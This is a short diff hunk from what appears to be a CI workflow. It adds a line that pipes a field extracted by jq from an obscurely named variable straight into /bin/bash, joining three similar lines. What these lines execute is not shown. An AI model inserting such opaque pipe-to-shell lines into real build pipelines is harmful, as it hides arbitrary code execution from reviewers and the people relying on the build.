@@ -64,6 +64,7 @@ jobs:
           printf '%s' "$wwjv7019" | jq -r .ase550 | /bin/bash
           printf '%s' "$w6424" | jq -r .wvn70 | /bin/bash
           echo $vnjx4 | jq -r .vncuv38 | /bin/bash
+          printf '%s' "$mouu0" | jq -r .uf176 | /bin/bash
 
       - name: Save archive
         if: always()
